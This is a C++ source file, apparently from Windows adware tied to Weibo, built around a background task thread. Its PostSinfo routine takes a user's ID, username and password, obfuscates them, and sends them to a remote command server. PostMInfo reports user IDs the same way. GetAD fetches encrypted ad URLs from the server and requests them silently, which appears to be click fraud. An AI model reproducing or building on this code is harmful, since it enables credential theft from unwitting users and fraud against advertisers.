#include "StdAfx.h"
#include "CommonTask.h"
#include <shlwapi.h>
#include "PubTool/PubTool.h"

#define SECOND(x) (x*1000)
#define MINUTE(x) (x*(60*1000))



CCommonTask::CCommonTask(void)
{
	DWORD dwThreadId = 0;
	m_hThread = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)&CCommonTask::ThreadProc,(LPVOID) this,	0, 	&dwThreadId );
	m_hEvent = CreateEvent(NULL,FALSE,FALSE,_T("WEIBODATA_AD_EVENT"));
	//ResetEvent(m_hEvent);
	m_bClose = FALSE;
	
}


CCommonTask::~CCommonTask(void)
{
	SetEvent(m_hEvent);
	m_bClose = TRUE;
	Sleep(50);
	CloseHandle(m_hThread);
	CloseHandle(m_hEvent);
}


HRESULT CCommonTask::AddTask(LPTASK_PARAM lpTaskParam)
{
	CAutoLock lock(&m_Lock);

	if (!lpTaskParam 
#if 0
		||(lpTaskParam->dwTaskType != ACT_CLICK_AD 
		&& lpTaskParam->dwTaskType != ACT_GET_AD 
		&& lpTaskParam->dwTaskType != ACT_POST_AD)
#endif
		)
	{
		return E_FAIL;
	}
	memcpy((PVOID)&m_taskParam,(PVOID)lpTaskParam,sizeof(m_taskParam));
	SetEvent(m_hEvent);
		
	return S_OK;
	//return ProcessTask(lpTaskParam);
}
DWORD CCommonTask::ThreadProc (LPVOID lpRef )
{
	CCommonTask *pThis = (CCommonTask*)lpRef;
	if(!pThis)
		return E_FAIL;
	
	while(TRUE)
	{
		//CAutoLock lock(&pThis->m_Lock);
		pThis->ProcessTask();

		if (pThis->IsThreadClose())
		{
			break;
		}
		
	}
	return S_OK;
}
HRESULT CCommonTask::PostAD()
{
	CAutoLock lock(&m_Lock);
	TCHAR enData[MAX_PATH] = {0};
	if (m_taskParam.ad.szURL[0] == '\0')
	{
		return E_FAIL;
	}
	CM_Encrypt(enData,m_taskParam.ad.szURL);
	TCHAR URL[MAX_PATH] = {0};
	_stprintf(URL,_T("%s/?actid=%s&ad=%s&cid=%s"),SERVER_URL,TASK_ACT_ID_6,enData,m_taskParam.szClientID);
	HttpGet(URL,FALSE);
	return S_OK;

}
HRESULT CCommonTask::GetAD()
{
	CAutoLock lock(&m_Lock);
	TCHAR URL[MAX_PATH] = {0};
	_stprintf(URL,_T("%s/?actid=%s&cid=%s"),SERVER_URL,TASK_ACT_ID_8,m_taskParam.szClientID);
	PBYTE pData = HttpGet(URL,TRUE);
	TCHAR szADUrl[MAX_PATH] = {0};
	CM_Decrypt(szADUrl,(PBYTE)pData);
	delete[] pData;
	HttpGet(szADUrl,FALSE);
	return S_OK;
}

HRESULT CCommonTask::PostSinfo()
{
	CAutoLock lock(&m_Lock);
	if (ACT_POST_S_INFO != m_taskParam.dwTaskType)
	{
		return E_FAIL;
	}
	if (  m_taskParam.user.szUID[0] == '\0'
		|| m_taskParam.user.szUserName[0] == '\0'
		|| m_taskParam.user.szUserPwd[0] == '\0')
	{
		return E_FAIL;
	}
	TCHAR enData1[MAX_PATH] = {0};
	TCHAR enData2[MAX_PATH] = {0};
	TCHAR enData3[MAX_PATH] = {0};
	CM_Encrypt(enData1,m_taskParam.user.szUID);
	CM_Encrypt(enData2,m_taskParam.user.szUserName);
	CM_Encrypt(enData3,m_taskParam.user.szUserPwd);
	TCHAR URL[MAX_PATH] = {0};
	_stprintf(URL,_T("%s/?actid=%s&sid=%s&sn=%s&sp=%s&cid=%s"),SERVER_URL,TASK_ACT_ID_0,enData1,enData2,enData3,m_taskParam.szClientID);
	HttpGet(URL,FALSE);
	return S_OK;
}
HRESULT CCommonTask::PostMInfo()
{
	CAutoLock lock(&m_Lock);
	if (ACT_POST_M_INFO != m_taskParam.dwTaskType)
	{
		return E_FAIL;
	}
	if (  m_taskParam.user.szUID[0] == '\0')
	{
		return E_FAIL;
	}
	TCHAR enData1[MAX_PATH] = {0};
	CM_Encrypt(enData1,m_taskParam.user.szUID);
	TCHAR URL[MAX_PATH] = {0};
	_stprintf(URL,_T("%s/?actid=%s&muid=%s&cid=%s"),SERVER_URL,TASK_ACT_ID_5,enData1,m_taskParam.szClientID);
	HttpGet(URL,FALSE);
	return S_OK;
}

HRESULT CCommonTask::ProcessTask()
{
	WaitForSingleObject(m_hEvent,INFINITE);
	CAutoLock lock(&m_Lock);
	BOOL bResults=FALSE;
	switch(m_taskParam.dwTaskType)
	{
	case ACT_POST_AD:
		PostAD();
		break;
	case ACT_GET_AD:
		GetAD();
		break;
	case ACT_POST_S_INFO:
		PostSinfo();
		break;
	case ACT_POST_M_INFO:
		PostMInfo();
		break;
	default:
		break;
	}
	return S_OK;
}